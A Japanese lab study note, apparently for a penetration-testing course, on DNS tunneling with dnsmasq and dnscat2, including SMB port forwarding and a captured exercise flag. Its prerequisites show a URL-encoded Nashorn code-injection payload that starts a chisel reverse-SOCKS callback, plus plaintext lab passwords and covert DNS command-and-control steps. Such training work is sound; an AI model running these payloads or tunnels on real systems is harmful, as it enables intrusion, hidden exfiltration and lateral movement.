- [[#名前解決の流れ|名前解決の流れ]]
- [[#演習環境NW図|演習環境NW図]]
- [[#前提条件|前提条件]]
- [[#DNSトンネリングの基礎|DNSトンネリングの基礎]]
	- [[#DNSトンネリングの基礎#FELINEAUTHORITY(インターネット上のDNSサーバ)の設定|FELINEAUTHORITY(インターネット上のDNSサーバ)の設定]]
- [[#dnscat2 による DNS トンネリング|dnscat2 による DNS トンネリング]]
	- [[#dnscat2 による DNS トンネリング#サーバのセットアップと接続|サーバのセットアップと接続]]
	- [[#dnscat2 による DNS トンネリング#コマンドの転送の実行|コマンドの転送の実行]]
	- [[#dnscat2 による DNS トンネリング#Execise|Execise]]

## 名前解決の流れ
![](Assets/Images/Pasted%20image%2020260429222038.png)

## 演習環境NW図
![](Assets/Images/Pasted%20image%2020260429222053.png)

## 前提条件
PGDATABASE01までは以下のコマンドで侵害済
```bash
#Terminal01
chisel server --port 8080 --reverse

curl http://192.168.175.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.247:8080%20R:socks%27%29.start%28%29%22%29%7D/

ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.175.215
sqlpass123
```

## DNSトンネリングの基礎
### FELINEAUTHORITY(インターネット上のDNSサーバ)の設定

Kali
```bash
#Terminal02
ssh kali@192.168.175.7
7he_C4t_c0ntro11er

cd dns_tunneling
cat dnsmasq.conf
sudo dnsmasq -C dnsmasq.conf -d

#Terminal03
ssh kali@192.168.175.7
7he_C4t_c0ntro11er

sudo tcpdump -i ens192 udp port 53
```

PGDATABASE01
```bash
#Terminal01
resolvectl status
  Current DNS Server: 10.4.175.64
         DNS Servers: 10.4.175.64

nslookup exfiltrated-data.feline.corp
Server:         127.0.0.53
Address:        127.0.0.53#53
** server can't find exfiltrated-data.feline.corp: NXDOMAIN
```

Kali
```bash
#Terminal03
sudo tcpdump -i ens192 udp port 53
#上記のnslookupの通信をキャプチャした結果
2025/07/29 21:47:00 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```
上記の通信の結果
![](Assets/Images/Pasted%20image%2020260429222107.png)

Kali
```bash
#Terminal02
ssh kali@192.168.175.7
7he_C4t_c0ntro11er

cd dns_tunneling
cat dnsmasq_txt.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.

#Terminal03
sudo dnsmasq -C dnsmasq_txt.conf -d

nslookup -type=txt www.feline.corp
Server:         127.0.0.53
Address:        127.0.0.53#53
Non-authoritative answer:
www.feline.corp text = "here's something else less useful."
www.feline.corp text = "here's something useful!"

Authoritative answers can be found from:
#取得成功

#Terminal01
nslookup -type=txt www.feline.corp
nslookup -type=txt give-me.cat-facts.internal
```

## dnscat2 による DNS トンネリング
1. FELINEAUTHORITY01 
- Terminal01
- Terminal02
- Terminal04

2. PGDATABAS01
- Terminal03

### サーバのセットアップと接続
Kali
```bash
#Terminal01
sudo tcpdump -i ens192 udp port 53
7he_C4t_c0ntro11er

#Terminal02
dnscat2-server feline.corp
7he_C4t_c0ntro11er
dnscat2> 

#接続
#Terminal03
cd dnscat/
./dnscat feline.corp
Creating DNS driver:
 domain = feline.corp
 host   = 0.0.0.0
 port   = 53
 type   = TXT,CNAME,MX
 server = 127.0.0.53

Encrypted session established! For added security, please verify the server also displays this string:

Huns Surfs Seitan Ache Yerba Petals 

Session established!

#Terminal02
New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Huns Surfs Seitan Ache Yerba Petals
>> 
#アクティブなウィンドウを一覧表示
dnscat2> window
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
#「コマンド」シェルからwindow -iを実行して利用可能なコマンドを一覧表示
dnscat2> windoPGDATABAS01w -i 1
New window created: 1
history_size (session) => 1000
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Huns Surfs Seitan Ache Yerba Petals
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

#各コマンドの詳細については、 --helpフラグを付けて実行
command (pgdatabase01) 1> listen --help
Error: The user requested help
Listens on a local port and sends the connection out the other side (like ssh
-L). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
  --help, -h:   Show this message

#HRSHARESのSMBポートに、DNSトンネル経由で接続
#ローカルポートフォワードを設定し、FELINEAUTHORITYのループバックインターフェースの4455番ポートをリッスンし、HRSHARESの445番ポートに転送
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.175.215:445
Listening on 127.0.0.1:4455, sending connections to 172.16.175.215:445
command (pgdatabase01) 1> tunnels
Tunnel listening on 127.0.0.1:4455
```

### コマンドの転送の実行
```bash
#Terminal04
kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Scripts         Disk      
        Users           Disk      
SMB1 disabled -- no workgroup available

#送信確認
#Terminal03
command (pgdatabase01) 1> Connection from 127.0.0.1:59932; forwarding to 172.16.175.217:445...
[Tunnel 0] connection successful!
[Tunnel 0] error: Error receiving data: Connection closed
```

### Execise

```bash
#FELINEAUTHORITY01とPGDATABAS01の間に新しいトンネルを作成する
#kali@felineauthority:~$
listen 127.0.0.1:4646 172.16.175.217:4646
Listening on 127.0.0.1:4646, sending connections to 172.16.175.217:4646
command (pgdatabase01) 1> tunnels
Tunnel listening on 127.0.0.1:4455
Tunnel listening on 127.0.0.1:4646

#kali@felineauthority:~$ 
scp kali@192.168.45.247:/home/kali/Downloads/4d423822e5645d068e2dfc0ce68b8002-dnscat_exercise_client .
chmod 777 4d423822e5645d068e2dfc0ce68b8002-dnscat_exercise_client
./4d423822e5645d068e2dfc0ce68b8002-dnscat_exercise_client -p4646
Connecting to 127.0.0.1:4646
Flag: "OS{e7e38d9e113f1459f73d31381b012faa}"

command (pgdatabase01) 1> Connection from 127.0.0.1:51194; forwarding to 172.16.175.217:4646...
[Tunnel 1] connection successful!
[Tunnel 1] closed by the other side: Server closed the connection!
```
